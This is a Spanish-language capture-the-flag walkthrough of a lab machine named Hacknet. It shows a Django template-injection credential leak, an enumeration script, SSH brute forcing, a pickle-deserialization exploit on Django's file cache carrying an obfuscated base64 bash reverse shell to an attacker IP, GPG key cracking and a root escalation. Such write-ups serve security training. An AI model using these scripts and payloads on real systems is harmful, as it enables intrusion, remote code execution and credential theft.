
# Hacknet

<figure><img src="/files/MSulwVL6uAqRq3XkOyPV" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Hacknet`
* **IP:** `10.10.11.85`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `17-11-2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.85 hacknet.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -A -T5 10.10.11.85
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: HackNet - social network for hackers
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web. El análisis de los encabezados HTTP revela que la aplicación está desarrollada con **Django**, el conocido framework web en Python.

### Acceso Web

Accedemos a `http://hacknet.htb` y observamos que parece ser una red social para hackers.

Estas funcionalidades sugieren una aplicación típica basada en **Django** y Python, donde el backend gestiona usuarios, sesiones y formularios.

<figure><img src="/files/5QXe3uAhmOadqnRT7jvH" alt=""><figcaption></figcaption></figure>

Tras crear una cuenta en el sitio, se observa que el usuario puede realizar las siguientes acciones dentro de la aplicación:

* Editar su información personal (nombre, firma, foto de perfil).
* Enviar mensajes a otros usuarios o a sí mismo.
* Dar “me gusta” o reacciones a publicaciones de otros.

<figure><img src="/files/PWhlgdWne8wNufoOoSi6" alt=""><figcaption></figcaption></figure>

***

### Hipótesis: Vulnerabilidad SSTI (Server-Side Template Injection)

Dado que se trata de un entorno Python, el primer vector a considerar es una posible inyección de plantillas del lado del servidor (SSTI).

Sin embargo, Django no utiliza Jinja2 por defecto, sino su propio motor de plantillas, conocido como DTL (Django Template Language), que tiene un comportamiento mucho más restringido.

#### Diferencias clave con Jinja2:

* ❌ **No ejecuta código Python.**
* ❌ Expresiones como `{{7*7}}`, `{{os.environ}}` o `{{().__class__}}` **no se evalúan**.
* ✅ Solo se pueden renderizar **variables del contexto** definidas por la aplicación (por ejemplo: `{{ user }}`, `{{ request }}`, `{{ settings.DEBUG }}`).
* 🚫 No permite realizar operaciones aritméticas ni acceder directamente al sistema.

#### En resumen:

* En **DTL puro**, una inyección SSTI **no conduce a ejecución remota de código**.
* El impacto se limita a la **filtración de datos** dentro del contexto de la plantilla, es decir, solo se pueden ver valores ya disponibles en la vista que renderiza la página.

***

### Posible vector: filtración de información sensible

Aunque el entorno no permite ejecución de comandos, **sí podría exponer datos internos del contexto** si la aplicación muestra variables de forma insegura.\
Esto abre la puerta a una **filtración de información** o **exposición de credenciales de otros usuarios**, especialmente si algunas páginas personales (perfiles, mensajes, etc.) contienen información restringida.

> Por lo tanto, el siguiente paso consiste en revisar si las plantillas de los perfiles o mensajes permiten acceder a datos de otros usuarios o revelar variables sensibles del contexto, lo cual podría constituir una vulnerabilidad de tipo *Information Disclosure* en Django.

<figure><img src="/files/v4Vaeo9McAqpZIfslSg2" alt=""><figcaption></figcaption></figure>

En editar el perfil, cambiaré mi nombre de usuario a `{{ users }}` e intentaré filtrar el array de usuarios mediante renderizado.&#x20;

<figure><img src="/files/tta9WRrCIGIMm4Yr9U8D" alt=""><figcaption></figcaption></figure>

Un posible punto de renderizado sería dar "me gusta" a un artículo al azar y luego ver **la** lista de "me gusta".

<figure><img src="/files/Khw5m6qVg6076Y1eXWWB" alt=""><figcaption></figcaption></figure>

En el código fuente, se puede ver la variable de usuarios listados:

<figure><img src="/files/ScZnqC0d7RmiR4rfAF9N" alt=""><figcaption></figcaption></figure>

```bash
<QuerySet [
    <SocialUser: cyberghost>,
    <SocialUser: shadowcaster>,
    <SocialUser: glitch>,
    <SocialUser: netninja>,
    <SocialUser: exploit_wizard>,
    <SocialUser: whitehat>,
    <SocialUser: deepdive>,
    <SocialUser: virus_viper>,
    <SocialUser: brute_force>,
    <SocialUser: {{ users }}>
]>
```

Se trata de **una lista de usuarios (QuerySet)** , donde cada elemento es un objeto `SocialUser`. A continuación, recuperamos los campos y valores de los objetos de la lista.

A continuación, debemos cambiar el nombre de nuestro usuario a:

```django
{{ users.values }}
```

Y volvemos a dar me gusta a un artículo, ver la lista de likes y ver el código fuente de la página:

<figure><img src="/files/klyr0Dx8b1C19VwQl5AO" alt=""><figcaption></figcaption></figure>

Y buuum! Tenemos todos los emails y contraseñas de los usuarios.

Es importante tener en cuenta que la lista de usuarios que se muestra aquí solo incluye la lista actual de "me gusta", es decir, los usuarios a los que les gustó la publicación, y el número de "me gusta" para cada comentario es diferente.

### Script de enumeración

Utilizaremos el siguiente script para enumerar y visualizar correctamente los usuarios y contraseñas. Debemos poner los valores del `sessionid` y `csrftoken` de nuestra sesión:

<figure><img src="/files/FDrFB9qsB5yFsaFQWZhY" alt=""><figcaption></figcaption></figure>

{% code title="exploit.py" %}

```python
import re  
import requests  
import html  

url = "http://hacknet.htb"  
headers = {  
    'Cookie': "csrftoken=hR2PU8nQyhj02LAS7HHGldIgnCvEEiGx; sessionid=v6nrqjn9pfvzmr9i816sghuqpcdxzdtd"  
}  

all_users = set()

for i in range(1, 31):  
    # Dar like  
    requests.get(f"{url}/like/{i}", headers=headers)  

    # Obtener lista de likes  
    text = requests.get(f"{url}/likes/{i}", headers=headers).text  

    # Buscar el último <img> title y decodificar  
    img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)  
    if not img_titles:  
        continue  
    last_title = html.unescape(img_titles[-1])  

    # Si no hay QuerySet, volver a dar like  
    if "<QuerySet" not in last_title:  
        requests.get(f"{url}/like/{i}", headers=headers)  
        text = requests.get(f"{url}/likes/{i}", headers=headers).text  
        img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)  
        if img_titles:  
            last_title = html.unescape(img_titles[-1])  

    # Coincidir correos y contraseñas por separado  
    emails = re.findall(r"'email': '([^']*)'", last_title)  
    passwords = re.findall(r"'password': '([^']*)'", last_title)  

    # Prefijo del correo + contraseña
    for email, p in zip(emails, passwords):  
        username = email.split('@')[0]  # Obtener prefijo del correo  
        all_users.add(f"{username}:{p}")  

# Imprimir los nombres de usuario:contraseña únicos
for item in all_users:  
    print(item)

```

{% endcode %}

Y ejecutamos el script:

```
python exploit.py

mikey:mYd4rks1dEisH3re
datadive:D@taD1v3r
cryptoraven:CrYptoR@ven42
deepdive:D33pD!v3r
darkseeker:D@rkSeek3r#
blackhat_wolf:Bl@ckW0lfH@ck
phreaker:Phre@k3rH@ck
hexhunter:H3xHunt3r!
netninja:N3tN1nj@2024
brute_force:BrUt3F0rc3#
packetpirate:P@ck3tP!rat3
shadowmancer:Sh@d0wM@ncer
codebreaker:C0d3Br3@k!
exploit_wizard:Expl01tW!zard
shadowwalker:Sh@dowW@lk2024
zero_day:Zer0D@yH@ck
test:afsh4ck
cyberghost:Gh0stH@cker2024
whitehat:Wh!t3H@t2024
virus_viper:V!rusV!p3r2024
rootbreaker:R00tBr3@ker#
glitch:Gl1tchH@ckz
trojanhorse:Tr0j@nH0rse!
bytebandit:Byt3B@nd!t123
stealth_hawk:St3@lthH@wk
shadowcaster:Sh@d0wC@st!
```

### Bruteforce de SSH

Guardamos el resultado anterior como `userpass.txt` y usamos hydra para obtener un usuario válido:

```q
hydra -C userpass.txt hacknet.htb ssh -I
```

<figure><img src="/files/uO6PkboKLNTEvKbEKa7a" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Acceso Inicial</mark>

```shell-session
afsh4ck@kali$ ssh mikey@hacknet.htb

The authenticity of host 'hacknet.htb (10.10.11.85)' can't be established.
ED25519 key fingerprint is SHA256:TVT7HGjgzl5Wk42d9xFlPlDUwhNCWjWA5Cdz6MdUC9o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'hacknet.htb' (ED25519) to the list of known hosts.
mikey@hacknet.htb's password: 
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Nov 17 07:34:15 2025 from 10.10.14.66

mikey@hacknet:~$ whoami
mikey
```

***

## <mark style="color:purple;">User Flag</mark>

```bash
mikey@hacknet:~$ ls
user.txt

mikey@hacknet:~$ cat user.txt 
28aa0dcef7d8831381edf121********
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos permisos de ejecución en la máquina, por lo que buscaremos otras vías:

```shell-session
mikey@hacknet:~$ sudo -l
[sudo] password for mikey: 
Sorry, user mikey may not run sudo on hacknet.
```

#### Shell Penelope

Para tener mayor control usaremos Penelope para enviar scripts de escalada de privilegios:

<figure><img src="/files/BprD7nEidVevj56HTBWt" alt=""><figcaption></figcaption></figure>

Podemos usar `F12` para hacer un session detached y usar el comando `run peass_ng` para ejecutar automáticamente un linpeas en el objetivo:

<figure><img src="/files/iZ2vIrWIenKR95OuXu4S" alt=""><figcaption></figcaption></figure>

Linpeas nos marca como punto crítico un ejecutable `/usr/bin/tcpdump cap_net_raw=eip` con capabilities:

<figure><img src="/files/5k3fT00FI2j70bl2INIm" alt=""><figcaption></figcaption></figure>

También encontramos archivos de backup que pueden contener credenciales:

```shell-session
mikey@hacknet:/var/www/HackNet/backups$ ls
backup01.sql.gpg  backup02.sql.gpg  backup03.sql.gpg
```

### Análisis del tráfico de red

Usaremos tcpdump en el objetivo para ver si obtenemos algo de información confidencial:

```shell-session
mikey@hacknet:/tmp$ tcpdump -i any -w /tmp/cap.pcap
tcpdump: data link type LINUX_SLL2
tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
```

No obtenemos nada relevante, así que analizaremos los backups.

### Análisis de backups

Los backups tienen una extensión .gpg, por lo que están cifrados y necesitaríamos una contraseña que no tenemos. Además observamos que el propietario de los archivos de backup es `sandy`, por lo que si conseguimos la contraseña de este usuario podremos hacernos con los archivos de backup:

```shell-session
mikey@hacknet:~$ ls -lh /var/www/HackNet/backups/                                                                                                                     
total 48K
-rw-r--r-- 1 sandy sandy 14K Dec 29  2024 backup01.sql.gpg
-rw-r--r-- 1 sandy sandy 14K Dec 29  2024 backup02.sql.gpg
-rw-r--r-- 1 sandy sandy 14K Dec 29  2024 backup03.sql.gpg
```

### Enumerando el sistema

Explorando el sistema encontramos el fichero de configuración de Django, que expone una contraseña en plano para acceder a la base de datos:

```
/var/www/HackNet/HackNet/settings.py
```

```shell-session
mikey@hacknet:~$ cat /var/www/HackNet/HackNet/settings.py

from pathlib import Path
import os

BASE_DIR = Path(__file__).resolve().parent.parent
SECRET_KEY = 'agyasdf&^F&ADf87AF*Df9A5D^AS%D6DflglLADIuhldfa7w'
DEBUG = False
ALLOWED_HOSTS = ['hacknet.htb']

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'SocialNetwork'
]

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'hacknet',
        'USER': 'sandy',
        'PASSWORD': 'h@ckn3tDBpa$$',
        'HOST':'localhost',
        'PORT':'3306',
    }
}

<---SNIP--->
```

Encontramos la contraseña del usuario Sandy, que observamos que también tiene un usuario local en /home:

```shell-session
mikey@hacknet:/home$ ls
mikey  sandy
```

Pero al intentar cambiar a este usuario no funciona:

```shell-session
mikey@hacknet:/home$ su sandy
Password: 
su: Authentication failure
```

### Conexión a base de datos

```shell-session
mikey@hacknet:/home$ mysql -u sandy -p
Enter password: 

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1585
Server version: 10.11.11-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

#### Ver bases de datos disponibles

```sql
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hacknet            |
| information_schema |
| mysql              |
+--------------------+
3 rows in set (0.002 sec)

MariaDB [(none)]> use hacknet
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

#### Ver tablas

Encontramos algunas tablas interesantes:

```sql
MariaDB [hacknet]> show tables;
+-----------------------------------+
| Tables_in_hacknet                 |
+-----------------------------------+
| SocialNetwork_contactrequest      |
| SocialNetwork_socialarticle       |
| SocialNetwork_socialarticle_likes |
| SocialNetwork_socialcomment       |
| SocialNetwork_socialmessage       |
| SocialNetwork_socialuser          |
| SocialNetwork_socialuser_contacts |
| auth_group                        |
| auth_group_permissions            |
| auth_permission                   |
| auth_user                         |
| auth_user_groups                  |
| auth_user_user_permissions        |
| django_admin_log                  |
| django_content_type               |
| django_migrations                 |
| django_session                    |
+-----------------------------------+
17 rows in set (0.001 sec)
```

Pero en la tabla `auth_user` encontramos un usuario admin y un hash en formato `pbkdf2_sha256`:

```sql
MariaDB [hacknet]> SELECT username, password FROM auth_user;
+----------+------------------------------------------------------------------------------------------+
| username | password                                                                                 |
+----------+------------------------------------------------------------------------------------------+
| admin    | pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ= |
+----------+------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)
```

### Cracking de hash

Usaremos el modo 10000 de hashcat para `pbkdf2_sha256`

```bash
hashcat -m 10000 hash.txt /usr/share/wordlists/rockyou.txt
```

Después de mucho tiempo no conseguimos crackear el hash (debe ser una contraseña compleja), por lo que buscaremos otra vía de escalada de privilegios.

### Seguimos enumerando

Hay un directorio `/var/tmp/django_cache` sobre el que tenemos permisos de escritura:

```shell-session
mikey@hacknet:/var/tmp/django_cache$ ls -la
total 36
drwxrwxrwx 2 sandy www-data 4096 Nov 17 10:08 .
drwxrwxrwt 4 root  root     4096 Nov 17 00:00 ..
-rw------- 1 sandy www-data   34 Nov 17 10:08 1f0acfe7480a469402f1852f8313db86.djcache
-rw------- 1 sandy www-data 2795 Nov 17 10:08 90dbab8f3b1e54369abdeb4ba1efc106.djcache
```

Al examinar el código fuente de `/var/www/HackNet/SocialNetwork/views.py` por separado del directorio del sitio web , se encontraron las siguientes secciones:

```php
#line 489
@cache_page(60)  
def explore(request):  
    if not "email" in request.session.keys():  
        return redirect("index")  
  
    session_user = get_object_or_404(SocialUser, email=request.session['email'])  
  
    page_size = 10  
    keyword = ""  
  
    if "keyword" in request.GET.keys():  
        keyword = request.GET['keyword']  
        posts = SocialArticle.objects.filter(text__contains=keyword).order_by("-date")  
    else:  
        posts = SocialArticle.objects.all().order_by("-date")  
  
    pages = ceil(len(posts) / page_size)  
  
    if "page" in request.GET.keys() and int(request.GET['page']) > 0:  
        post_start = int(request.GET['page'])*page_size-page_size  
        post_end = post_start + page_size  
        posts_slice = posts[post_start:post_end]  
    else:  
        posts_slice = posts[:page_size]  
  
    news = get_news()  
    request.session['requests'] = session_user.contact_requests  
    request.session['messages'] = session_user.unread_messages  
  
    for post_item in posts:  
        if session_user in post_item.likes.all():  
            post_item.is_like = True  
  
    posts_filtered = []  
    for post in posts_slice:  
        if not post.author.is_hidden or post.author == session_user:  
            posts_filtered.append(post)  
        for like in post.likes.all():  
            if like.is_hidden and like != session_user:  
                post.likes_number -= 1  
  
    context = {"pages": pages, "posts": posts_filtered, "keyword": keyword, "news": news, "session_user": session_user}  
  
    return render(request, "SocialNetwork/explore.html", context)
```

#### Relacionado con el directorio de caché anterior

Los resultados generados por la vista se almacenan en caché durante **60 segundos**.

{% hint style="info" %}
De forma predeterminada, Django utiliza el backend **`FileBasedCache`** (o un sistema de caché equivalente) para guardar los valores de retorno de las vistas.
{% endhint %}

***

#### Riesgo de seguridad

Si el directorio de caché es **escribible** por un usuario no privilegiado y el contenido almacenado se guarda mediante **`pickle`**, existe un **riesgo crítico de seguridad**. Un atacante podría aprovecharlo para realizar **ataques de deserialización** y lograr una **ejecución remota de código (RCE)**.

Django lee directamente el contenido de los archivos en caché usando la función `pickle.loads()` **sin aplicar ningún tipo de filtrado o validación**. Esto implica que si conocemos el **nombre** y la **ubicación** de los archivos de caché, es posible **inyectar contenido malicioso serializado** y lograr que Django lo ejecute al deserializarlo.

En otras palabras, un atacante puede crear un objeto `pickle` manipulado que se cargue desde la caché y, de ese modo, ejecutar código arbitrario en el sistema.

***

## <mark style="color:purple;">Explotación de Django</mark>

El procedimiento consiste en:

1. Acceder a la ruta `/explore` para que Django genere una nueva entrada de caché.
2. Crear una carga útil maliciosa serializada con **`pickle`**.
3. Sobrescribir el archivo correspondiente en el directorio de caché con dicho payload.
4. Volver a acceder a `/explore` para forzar la lectura y deserialización del objeto, activando así la ejecución del código.

Usaremos el siguiente script para generar un payload pickle, que nos devuelva una nueva shell de Penelope. Usaremos el payload proporcionado por Penelope para conseguir la shell:

{% code title="penelope payload" %}

```bash
➤  tun0 → 10.10.14.66:443

Bash TCP
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjYvNDQzIDA+JjEpICY=|base64 -d|bash
```

{% endcode %}

{% code title="exploit.py" %}

```python
import pickle  
import base64  
import os  
import time  
  
# ---- Configuración ----
  
cache_dir = "/var/tmp/django_cache"  
cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjYvNDQzIDA+JjEpICY=|base64 -d|bash"  
  
# ---- Generar payload Pickle ----
  
class RCE:  
    def __reduce__(self):  
        return (os.system, (cmd,),)  
  
payload = pickle.dumps(RCE())  
  
# ---- Escribir en cada archivo de caché ----
  
for filename in os.listdir(cache_dir):  
    if filename.endswith(".djcache"):  
        path = os.path.join(cache_dir, filename)  
        try:  
            os.remove(path)  # Eliminar archivo original  
        except:  
            continue  
        with open(path, "wb") as f:  
            f.write(payload)  # Escribir payload pickle        
        print(f"[+] Written payload to {filename}")
```

{% endcode %}

Accedemos a `/explore` , ejecutamos el script y volvemos acceder a /explore para recibir una reverse shell como Sandy:

<figure><img src="/files/wZnvVLFurfAmcZ1nBCBU" alt=""><figcaption></figcaption></figure>

Una vez accedido como Sandy, en su directorio home encontramos las claves para extraer los archivos de backup:

```shell-session
sandy@hacknet:~/.gnupg/private-keys-v1.d$ ls -la
total 20
drwx------ 2 sandy sandy 4096 Sep  5 11:33 .
drwx------ 4 sandy sandy 4096 Sep  5 11:33 ..
-rw------- 1 sandy sandy 1255 Sep  5 11:33 0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
-rw------- 1 sandy sandy 2088 Sep  5 11:33 armored_key.asc
-rw------- 1 sandy sandy 1255 Sep  5 11:33 EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
```

El archivo `armored_key.asc` está cifrado y puede ser descifrado directamente por fuerza bruta.

Nos enviamos el archivo a nuestro Kali:

```shell-session
sandy@hacknet:~/.gnupg/private-keys-v1.d$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell-session
afsh4ck@kali$ wget 10.10.11.85:8000/armored_key.asc
```

#### Cracking de .asc

```shell-session
afsh4ck@kali$ gpg2john armored_key.asc >> hash.txt

File armored_key.asc
```

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
</strong></code></pre>

<figure><img src="/files/aOv1FnwVyEtMpjc95mps" alt=""><figcaption></figcaption></figure>

#### Descifrar base de datos

Luego podemos escribir un script bash para descifrar el archivo de la base de datos.

{% code title="unencrypt.sh" %}

```bash
#!/bin/bash
# Desencriptar en lote los archivos de respaldo de HackNet

# Configuración
KEY_PATH="$HOME/.gnupg/private-keys-v1.d/armored_key.asc"
BACKUP_DIR="/var/www/HackNet/backups"
OUTPUT_DIR="/tmp"
PASSPHRASE="I CANT TELL YOU"

# Importar la clave privada
gpg --import "$KEY_PATH"

# Desencriptar en lote
for file in "$BACKUP_DIR"/*.gpg; do
    filename=$(basename "$file" .gpg)
    outpath="$OUTPUT_DIR/$filename.sql"
    echo "[*] Desencriptando $file → $outpath"
    if [ -n "$PASSPHRASE" ]; then
        gpg --batch --yes --passphrase "$PASSPHRASE" --pinentry-mode loopback -o "$outpath" -d "$file"
    else
        gpg --batch --yes -o "$outpath" -d "$file"
    fi
done

echo "[*] Listo. Los archivos desencriptados están en $OUTPUT_DIR"
```

{% endcode %}

Y lo ejecutamos de la siguiente manera:

```shell-session
sandy@hacknet:/tmp$ nano unencrypt.sh
sandy@hacknet:/tmp$ chmod +x unencrypt.sh 
sandy@hacknet:/tmp$ bash unencrypt.sh 

gpg: key D72E5C1FA19C12F7: "Sandy (My key for backups) <sandy@hacknet.htb>" not changed
gpg: key D72E5C1FA19C12F7: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
[*] Desencriptando /var/www/HackNet/backups/backup01.sql.gpg → /tmp/backup01.sql.sql
gpg: keybox '/home/sandy/.gnupg/pubring.kbx' created
gpg: encrypted with RSA key, ID FC53AFB0D6355F16
gpg: decryption failed: No secret key
[*] Desencriptando /var/www/HackNet/backups/backup02.sql.gpg → /tmp/backup02.sql.sql
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
[*] Desencriptando /var/www/HackNet/backups/backup03.sql.gpg → /tmp/backup03.sql.sql
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
[*] Listo. Los archivos desencriptados están en /tmp
```

Eso nos generará los archivos de backup desencriptados en la ruta `/tmp`:

```shell-session
sandy@hacknet:/tmp$ ls -la
total 148
drwxrwxrwt  8 root  root      4096 Nov 17 14:56 .
drwxr-xr-x 18 root  root      4096 Sep  8 13:46 ..
-rw-r--r--  1 sandy www-data 48626 Nov 17 14:56 backup02.sql.sql
-rw-r--r--  1 sandy www-data 48859 Nov 17 14:56 backup03.sql.sql
```

Y podemos extraer contraseñas con el siguiente comando:

```bash
cat backup0* | grep password
```

<figure><img src="/files/gZYRaPKdSjuIo1FK27Qk" alt=""><figcaption></figcaption></figure>

Encontramos una conversación entre dos personas que una le pide a otra la contraseña de MySQL root, y la tenemos en plano. Vamos a probarla!

```shell-session
sandy@hacknet:/tmp$ su root
Password: 

root@hacknet:/tmp# whoami
root
```

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
root@hacknet:/tmp# cd /root
root@hacknet:~# ls
root.txt
root@hacknet:~# cat root.txt 
a4968959926b8da1bff5931c********
```
